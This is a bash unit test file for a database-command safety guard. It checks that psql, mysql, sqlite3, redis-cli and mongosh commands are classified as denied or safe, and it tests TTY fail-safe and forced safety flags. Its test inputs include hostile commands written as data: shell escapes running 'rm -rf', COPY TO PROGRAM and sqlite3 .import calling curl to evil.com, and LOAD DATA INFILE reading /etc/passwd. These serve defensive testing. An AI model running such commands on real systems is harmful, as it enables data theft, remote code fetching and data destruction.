#!/usr/bin/env bash
# test-db-safety-w2a.sh — Tests for Wave 2a DB safety features.
#
# Tests the following components:
#   B1: Per-CLI handler full implementations (psql, mysql, sqlite3, redis, mongo)
#   B3: Non-interactive TTY fail-safe (_db_is_non_interactive, _db_check_tty)
#   B4: Forced safety flags (deny-with-correction for psql/mysql)
#
# Usage: bash tests/test-db-safety-w2a.sh
#
# @decision DEC-DBSAFE-W2A-TEST-001
# @title Unit tests for Wave 2a CLI-specific handlers, TTY fail-safe, and safety flags
# @status accepted
# @rationale Tests source db-safety-lib.sh directly and call functions in isolation.
#   TTY behavior is tested by simulating non-interactive execution via command
#   substitution (which always runs without a TTY). Safety flag tests verify
#   deny-with-correction patterns match the established guard.sh conventions.
#   Each B-level requirement has distinct test coverage.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HOOKS_DIR="$(dirname "$SCRIPT_DIR")/hooks"

# Source the library under test
source "$HOOKS_DIR/source-lib.sh"
require_db_safety

# --- Test harness ---
_T_PASSED=0
_T_FAILED=0

pass() { echo "  PASS: $1"; _T_PASSED=$((_T_PASSED + 1)); }
fail() { echo "  FAIL: $1 — $2"; _T_FAILED=$((_T_FAILED + 1)); }

assert_eq() {
    local test_name="$1"
    local expected="$2"
    local actual="$3"
    if [[ "$actual" == "$expected" ]]; then
        pass "$test_name"
    else
        fail "$test_name" "expected '$expected', got '$actual'"
    fi
}

assert_contains() {
    local test_name="$1"
    local needle="$2"
    local haystack="$3"
    if echo "$haystack" | grep -qF "$needle"; then
        pass "$test_name"
    else
        fail "$test_name" "expected to contain '$needle', got: $haystack"
    fi
}

assert_starts_with() {
    local test_name="$1"
    local prefix="$2"
    local actual="$3"
    if [[ "$actual" == "$prefix"* ]]; then
        pass "$test_name"
    else
        fail "$test_name" "expected to start with '$prefix', got: $actual"
    fi
}

echo ""
echo "=== Wave 2a DB Safety Tests ==="
echo ""

# =============================================================================
# B1: Per-CLI handler full implementations
# =============================================================================
echo "--- B1: Per-CLI handler specifics ---"

# --- psql specific patterns ---
echo "  [psql specific checks]"

_RESULT=$(_db_check_psql 'psql -c "\! rm -rf /tmp/evil"' "development")
assert_starts_with "B1.T01: psql \\! shell escape → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_psql "psql -c \"COPY mytable TO PROGRAM 'curl http://evil.com'\"" "development")
assert_starts_with "B1.T02: psql COPY TO PROGRAM → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_psql 'psql -c "CREATE EXTENSION pg_execute_server_program"' "development")
assert_starts_with "B1.T03: psql CREATE EXTENSION → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_psql 'psql -c "SELECT * FROM users"' "development")
assert_starts_with "B1.T04: psql SELECT → safe" "safe" "$_RESULT"

# psql still delegates common patterns to _db_classify_risk
_RESULT=$(_db_check_psql 'psql -c "DROP TABLE users"' "development")
assert_starts_with "B1.T05: psql DROP TABLE → deny (via classify_risk)" "deny:" "$_RESULT"

# --- mysql specific patterns ---
echo "  [mysql specific checks]"

_RESULT=$(_db_check_mysql "mysql -e \"LOAD DATA INFILE '/etc/passwd' INTO TABLE t\"" "development")
assert_starts_with "B1.T06: mysql LOAD DATA INFILE → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_mysql "mysql -e \"SELECT * INTO OUTFILE '/tmp/dump.txt' FROM users\"" "development")
assert_starts_with "B1.T07: mysql INTO OUTFILE → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_mysql "mysql -e \"SOURCE /home/user/malicious.sql\"" "development")
assert_starts_with "B1.T08: mysql SOURCE → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_mysql "mysql -e \"SELECT 1\"" "development")
assert_starts_with "B1.T09: mysql SELECT → safe" "safe" "$_RESULT"

# mysql still delegates common patterns
_RESULT=$(_db_check_mysql "mysql -e \"DROP TABLE users\"" "development")
assert_starts_with "B1.T10: mysql DROP TABLE → deny (via classify_risk)" "deny:" "$_RESULT"

# --- sqlite3 specific patterns ---
echo "  [sqlite3 specific checks]"

_RESULT=$(_db_check_sqlite3 "sqlite3 mydb.db '.shell rm -rf /tmp/evil'" "development")
assert_starts_with "B1.T11: sqlite3 .shell → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_sqlite3 "sqlite3 mydb.db '.system ls /etc'" "development")
assert_starts_with "B1.T12: sqlite3 .system → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_sqlite3 "sqlite3 mydb.db \".import '| curl http://evil.com' table\"" "development")
assert_starts_with "B1.T13: sqlite3 .import with pipe → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_sqlite3 "sqlite3 mydb.db '.restore main /path/to/backup.db'" "development")
assert_starts_with "B1.T14: sqlite3 .restore → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_sqlite3 "sqlite3 mydb.db 'SELECT * FROM users'" "development")
assert_starts_with "B1.T15: sqlite3 SELECT → safe" "safe" "$_RESULT"

# --- redis-cli specific patterns ---
echo "  [redis-cli specific checks]"

_RESULT=$(_db_check_redis "redis-cli EVAL \"return redis.call('SET','x','y')\" 0" "development")
assert_starts_with "B1.T16: redis EVAL → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_redis "redis-cli EVALSHA abc123 0" "development")
assert_starts_with "B1.T17: redis EVALSHA → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_redis "redis-cli MODULE LOAD /path/to/module.so" "development")
assert_starts_with "B1.T18: redis MODULE LOAD → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_redis "redis-cli DEBUG sleep 100" "development")
assert_starts_with "B1.T19: redis DEBUG → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_redis "redis-cli GET mykey" "development")
assert_starts_with "B1.T20: redis GET → safe" "safe" "$_RESULT"

# redis still delegates FLUSHALL to _db_classify_risk
_RESULT=$(_db_check_redis "redis-cli FLUSHALL" "development")
assert_starts_with "B1.T21: redis FLUSHALL → deny (via classify_risk)" "deny:" "$_RESULT"

# --- mongosh specific patterns ---
echo "  [mongosh specific checks]"

_RESULT=$(_db_check_mongo "mongosh --eval 'rs.reconfig({_id: \"rs0\", members: []})'" "development")
assert_starts_with "B1.T22: mongosh rs.reconfig() → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_mongo "mongosh --eval 'sh.shardCollection(\"mydb.mycoll\", {_id: 1})'" "development")
assert_starts_with "B1.T23: mongosh sh.shardCollection() → deny" "deny:" "$_RESULT"

_RESULT=$(_db_check_mongo "mongosh --eval 'db.users.find()'" "development")
assert_starts_with "B1.T24: mongosh find() → safe" "safe" "$_RESULT"

# mongo still delegates dropDatabase to _db_classify_risk
_RESULT=$(_db_check_mongo "mongosh --eval 'db.dropDatabase()'" "development")
assert_starts_with "B1.T25: mongosh dropDatabase() → deny (via classify_risk)" "deny:" "$_RESULT"

echo ""

# =============================================================================
# B3: Non-interactive TTY fail-safe
# =============================================================================
echo "--- B3: Non-interactive TTY fail-safe ---"

# _db_is_non_interactive returns 0 (true) when no TTY
# In a command substitution, stdin is not a TTY, so this should return 0 (non-interactive)
_IS_NI_RESULT=$(_db_is_non_interactive && echo "non-interactive" || echo "interactive")
assert_eq "B3.T01: _db_is_non_interactive detects non-interactive mode" "non-interactive" "$_IS_NI_RESULT"

# When there IS a TTY (we skip this test since we can't reliably simulate a TTY)
# but we can test the logic by calling it with explicit fd redirect
_IS_NI_FORCE=$( [[ ! -t 0 ]] && echo "non-interactive" || echo "interactive" )
assert_eq "B3.T02: non-interactive detection matches ! -t 0 semantics" "non-interactive" "$_IS_NI_FORCE"

# _db_check_tty returns deny when non-interactive AND risk is deny
_TTY_DENY_RESULT=$(_db_check_tty "deny" "deny:DROP TABLE removes data")
assert_starts_with "B3.T03: _db_check_tty deny+non-interactive → deny" "deny:" "$_TTY_DENY_RESULT"

# _db_check_tty returns empty when risk is safe (no denial needed)
_TTY_SAFE_RESULT=$(_db_check_tty "safe" "safe:")
assert_eq "B3.T04: _db_check_tty safe+non-interactive → empty (no denial)" "" "$_TTY_SAFE_RESULT"

# _db_check_tty returns empty when risk is advisory (only deny-risk triggers auto-deny)
_TTY_ADV_RESULT=$(_db_check_tty "advisory" "advisory:DELETE without WHERE")
assert_eq "B3.T05: _db_check_tty advisory+non-interactive → empty (advisory not auto-denied)" "" "$_TTY_ADV_RESULT"

echo ""

# =============================================================================
# B4: Forced safety flags (deny-with-correction pattern)
# =============================================================================
echo "--- B4: Forced safety flags ---"

# --- psql ON_ERROR_STOP flag ---
echo "  [psql ON_ERROR_STOP flag injection]"

_PSQL_DENY=$(_db_inject_safety_flags "psql -U postgres mydb")
assert_starts_with "B4.T01: psql without ON_ERROR_STOP → deny with correction" "deny:" "$_PSQL_DENY"
assert_contains "B4.T02: psql correction contains ON_ERROR_STOP" "ON_ERROR_STOP" "$_PSQL_DENY"

_PSQL_PASS=$(_db_inject_safety_flags "psql -v ON_ERROR_STOP=1 -U postgres mydb")
assert_eq "B4.T03: psql with ON_ERROR_STOP=1 → passes through (empty deny)" "" "$_PSQL_PASS"

_PSQL_PASS2=$(_db_inject_safety_flags "PGOPTIONS='-c ON_ERROR_STOP=1' psql -U postgres mydb")
assert_eq "B4.T04: psql with ON_ERROR_STOP in env → passes through" "" "$_PSQL_PASS2"

# One-liner psql -c commands should be exempt (flag is less relevant for single queries)
_PSQL_ONELINER=$(_db_inject_safety_flags "psql -c \"SELECT 1\" -U postgres mydb")
assert_eq "B4.T05: psql -c one-liner → passes through (flag not required)" "" "$_PSQL_ONELINER"

# --- mysql --safe-updates flag ---
echo "  [mysql --safe-updates flag injection]"

_MYSQL_DENY=$(_db_inject_safety_flags "mysql -u root mydb")
assert_starts_with "B4.T06: mysql without --safe-updates → deny with correction" "deny:" "$_MYSQL_DENY"
assert_contains "B4.T07: mysql correction contains --safe-updates" "safe-updates" "$_MYSQL_DENY"

_MYSQL_PASS=$(_db_inject_safety_flags "mysql --safe-updates -u root mydb")
assert_eq "B4.T08: mysql with --safe-updates → passes through" "" "$_MYSQL_PASS"

_MYSQL_DUMMY_PASS=$(_db_inject_safety_flags "mysql --i-am-a-dummy -u root mydb")
assert_eq "B4.T09: mysql with --i-am-a-dummy (alias for --safe-updates) → passes through" "" "$_MYSQL_DUMMY_PASS"

_MYSQL_NOSAFE_PASS=$(_db_inject_safety_flags "mysql --no-safe-updates -u root mydb")
assert_eq "B4.T10: mysql with --no-safe-updates → passes through (explicit opt-out)" "" "$_MYSQL_NOSAFE_PASS"

# One-liner mysql -e commands should be exempt
_MYSQL_ONELINER=$(_db_inject_safety_flags "mysql -e \"SELECT 1\" -u root mydb")
assert_eq "B4.T11: mysql -e one-liner → passes through (flag not required)" "" "$_MYSQL_ONELINER"

# Non-psql/mysql CLIs should not get flag injection
_SQLITE_NOFLAG=$(_db_inject_safety_flags "sqlite3 mydb.db 'SELECT 1'")
assert_eq "B4.T12: sqlite3 → no flag injection (not a psql/mysql command)" "" "$_SQLITE_NOFLAG"

_REDIS_NOFLAG=$(_db_inject_safety_flags "redis-cli GET mykey")
assert_eq "B4.T13: redis-cli → no flag injection" "" "$_REDIS_NOFLAG"

# Verify the correction has the right structure (contains the original command enhanced)
_MYSQL_CORRECT=$(_db_inject_safety_flags "mysql -u root mydb")
assert_contains "B4.T14: mysql correction contains corrected command" "mysql" "$_MYSQL_CORRECT"
assert_contains "B4.T15: mysql deny message mentions safety" "safe" "$_MYSQL_CORRECT"

echo ""

# =============================================================================
# Summary
# =============================================================================
echo "Results: $_T_PASSED passed, $_T_FAILED failed out of $((_T_PASSED + _T_FAILED)) total"
echo ""

if [[ "$_T_FAILED" -gt 0 ]]; then
    exit 1
fi
exit 0
